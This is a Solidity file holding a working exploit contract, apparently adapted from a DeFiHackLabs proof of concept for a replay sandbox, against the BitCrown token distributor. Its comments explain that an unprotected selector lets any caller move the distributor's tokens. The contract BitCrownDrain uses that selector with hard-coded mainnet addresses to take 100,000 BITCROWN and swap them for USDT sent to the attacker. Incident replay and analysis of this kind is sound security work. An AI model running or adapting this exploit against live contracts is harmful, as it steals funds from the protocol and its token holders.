// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-06-BitCrown).
// The DeFiHackLabs PoC runs the WHOLE attack inside the CONSTRUCTOR of
// `BitCrownInitcodeExploit` (test/BitCrown_exp.sol) — ContractTest.testExploit()
// just does `new BitCrownInitcodeExploit(ATTACKER)`; there is no callable
// entrypoint afterwards. The playground deploys the exploit contract BEFORE
// recording starts (deploy is unrecorded, see docs/EVM-playground-2.md §4), so
// the vulnerable calls must live in a recorded `attackFunction`, not the
// constructor. This single-contract version therefore moves the original
// constructor body into `run()` (called externally, after deploy) — everything
// else (the exact selector, args, and profit forwarding) is copied verbatim
// from BitCrownInitcodeExploit's constructor.
//
// Root cause: the BitCrown distributor at 0x93b621A9…2A7E exposes an
// unverified, unprotected selector 0x1239ec8c — decoded here as
// batchTransfer(address token, address[] recipients, uint256[] amounts) — that
// lets ANY caller choose the token, recipient list, and amounts to move out of
// the distributor's own token balance, with no access control. The attacker
// simply asks it to send 100,000 BITCROWN to a helper contract it controls,
// then sells that BitCrown through the canonical Pancake router for USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract BitCrownDrain {
    address constant BITCROWN_DISTRIBUTOR = 0x93b621A9f8F1821a6a693A29672ca3d6612A2A7E;
    address constant BITCROWN = 0x3f74A64Eb5641D2479cB8343B2330c6598D126d4;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;

    bytes4 constant DISTRIBUTE_SELECTOR = 0x1239ec8c;

    // step 0: entrypoint (mirrors BitCrownInitcodeExploit's constructor, moved
    // into a callable function so the recorder captures it). `profitReceiver`
    // is the attacker EOA, exactly like the constructor arg in the original PoC.
    function run(
        address profitReceiver
    ) external {
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100_000 ether;

        // step 1: call the unverified distributor selector, choosing this
        // contract as the recipient of 100,000 BitCrown it doesn't own.
        (bool success,) = BITCROWN_DISTRIBUTOR.call(
            abi.encodeWithSelector(DISTRIBUTE_SELECTOR, BITCROWN, recipients, amounts)
        );
        require(success, "distributor call failed");

        // step 2: sell the received BitCrown through the canonical Pancake
        // router for USDT, sent directly to profitReceiver.
        uint256 bitCrownBalance = IERC20(BITCROWN).balanceOf(address(this));
        IERC20(BITCROWN).approve(PANCAKE_ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = BITCROWN;
        path[1] = USDT_TOKEN;

        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bitCrownBalance, 0, path, profitReceiver, block.timestamp
        );
    }
}
